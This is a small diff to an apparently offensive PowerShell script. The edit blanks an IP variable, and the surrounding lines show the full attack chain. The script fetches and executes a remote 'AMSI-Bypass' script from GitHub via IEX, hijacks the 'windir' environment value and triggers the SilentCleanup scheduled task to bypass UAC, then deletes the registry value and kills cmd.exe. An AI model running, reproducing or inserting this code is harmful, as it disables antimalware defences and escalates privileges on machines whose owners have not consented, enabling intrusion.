@@ -1,4 +1,4 @@
-﻿$ip = 'localhost'
+﻿$ip = ''
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1')
 $registryPath = "HKCU:\Environment"
 $Name = "windir"
@@ -8,4 +8,3 @@ schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
 sleep 2
 Remove-ItemProperty -Path $registryPath -Name $name
 taskkill /f /im cmd.exe
-
